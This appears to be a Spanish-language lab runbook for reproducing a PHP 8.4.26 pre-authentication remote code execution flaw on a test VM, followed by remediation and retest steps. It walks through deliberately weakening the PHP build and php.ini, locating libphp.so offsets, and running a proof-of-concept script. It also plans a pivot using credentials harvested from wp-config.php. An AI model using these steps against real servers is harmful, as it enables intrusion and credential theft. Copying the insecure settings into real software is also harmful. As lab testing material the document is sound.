# W2 · PHP2Shell · CVE-2026-109618 / CVE-2026-109619

## 1. Ficha

| Campo | Valor |
|---|---|
| VM | M1 `10.10.10.11` |
| Servicio | PHP 8.4.26 (mod_php) |
| Versión instalada | **8.4.26** |
| Rango vulnerable | 8.4.0–8.4.26 · 8.3.0–8.3.35 · 8.2.0–8.2.34 · 8.5.0–8.5.11 |
| Versión que corrige | **8.4.27** (y 8.3.36 / 8.2.35 / 8.5.12) |
| CVSS | 9.8 v3.1 / 9.2 v4.0 (109618); 8.1 v3.1 / 9.2 v4.0 (109619) |
| CWE | CWE-416 / CWE-755 / CWE-824 |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2026-109618 |
| Artefacto | `artifacts/vulnerable/php-8.4.26.tar.gz` |
| PoC | `artifacts/pocs/php2shell-poc-main.zip` |
| Estado | **Válida con cambio**: hoy ZTS + event; recompilar NTS + prefork |

## 2. Precondiciones

- PHP 8.4.26 **NTS** (no ZTS).
- Apache **prefork** con `mod_php`.
- `display_errors=1`, `memory_limit=8M`, `max_input_vars=1000`.
- `session.upload_progress.enabled=On`, `session.use_cookies=1`, `session.use_strict_mode=0`.
- Offsets de `libphp.so` (`zif_system`, `zval_ptr_dtor`, `htdata`).
- Comando de máximo **14 bytes**.

## 3. Flujo

1. Snapshot M1: `previo-a-W2` y, si se recompila, `previo-a-W2-rebuild`.
2. Verificar build y MPM:

```bash
/usr/local/apache2/bin/httpd -V | grep MPM
/usr/local/bin/php -i | grep -E 'Thread Safety|Server API|memory_limit|display_errors|session.upload_progress.enabled|max_input_vars'
```

3. Si es ZTS o event, recompilar **NTS** y cambiar a **prefork**:

```bash
# Recompilar sin --enable-zts
./configure --with-apxs2=/usr/local/apache2/bin/apxs \
  --with-mysqli --with-pdo-mysql --with-curl --with-openssl \
  --with-zip --enable-mbstring --enable-intl --enable-gd \
  --with-external-gd --with-jpeg --with-freetype --enable-exif \
  --with-sodium --enable-opcache --with-zlib
make -j"$(nproc)" && sudo make install

# Apache: desactivar event, activar prefork
sudo sed -i 's/^LoadModule mpm_event_module/#LoadModule mpm_event_module/' /usr/local/apache2/conf/httpd.conf
sudo sed -i 's/^#LoadModule mpm_prefork_module/LoadModule mpm_prefork_module/' /usr/local/apache2/conf/httpd.conf
```

4. Ajustar `/usr/local/lib/php.ini`:

```ini
memory_limit = 8M
display_errors = On
max_input_vars = 1000
session.upload_progress.enabled = On
session.use_cookies = 1
session.use_strict_mode = 0
```

5. Reiniciar Apache y verificar:

```bash
sudo /usr/local/apache2/bin/apachectl restart
curl -sI http://10.10.10.11 | grep -i x-powered-by
```

6. Derivar offsets si el PoC no los trae:

```bash
nm -D /usr/local/apache2/modules/libphp.so | grep -E 'zif_system|zval_ptr_dtor'
```

7. Ejecutar el PoC:

```bash
unzip -q php2shell-poc-main.zip
cd php2shell-*-main
python3 poc_109618.py -u http://10.10.10.11/index.php \
  -c 'id>p1.txt' --fetch /p1.txt
```

## 4. Resultado esperado

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

o el archivo `p1.txt` con `uid=33(www-data)`.

## 5. Evidencia

- `EV-W2-01`: `httpd -V` (prefork) y `php -i` (NTS).
- `EV-W2-02`: OOM/cookie/errores del PoC.
- `EV-W2-03`: `id` o `p1.txt`.
- `LOG-W2`: sesión completa.
- SHA256.

## 6. Impacto y siguiente salto

- RCE pre-auth como `www-data`.
- Disclosure de memoria del worker (posibles credenciales/tokens).
- Mismo loot que W1: `wp-config.php` → M2.

## 7. Fallback

- Time-box **3–4 h**.
- Si no reproduce: documentar la limitación (ZTS/offsets/build custom) y usar W1/W3/W4.
- No afirmar RCE sin `id`.

## 8. Remediación

- PHP **8.4.27+**; reiniciar workers.
- Temporal: `session.upload_progress.enabled=Off`.
- Revisar logs de OOM, `zend_mm_heap corrupted` y procesos hijos.

## 9. Retest

```bash
curl -sI http://10.10.10.11 | grep -i x-powered-by
php -v
session.upload_progress.enabled=Off
# mismo PoC: debe fallar
```

Esperado: `PHP/8.4.27`, PoC falla, sin OOM.

## 10. EARS

- **REQ-W2-01 (Estado).** MIENTRAS se use PHP 8.4.26 para W2, el laboratorio DEBE usar NTS + prefork.
- **REQ-W2-02 (Evento).** CUANDO se ejecute el PoC, el laboratorio DEBE capturar `id` o documentar la limitación.
- **REQ-W2-03 (Ubicuo).** La remediación DEBE dejar PHP 8.4.27+ y el PoC DEBE fallar.

## 11. Checklist

- [ ] Snapshot `previo-a-W2`.
- [ ] Build NTS + prefork.
- [ ] php.ini ajustado.
- [ ] Offsets derivados.
- [ ] PoC ejecutado.
- [ ] `id` o limitación documentada.
- [ ] Remediación 8.4.27.
- [ ] Retest.
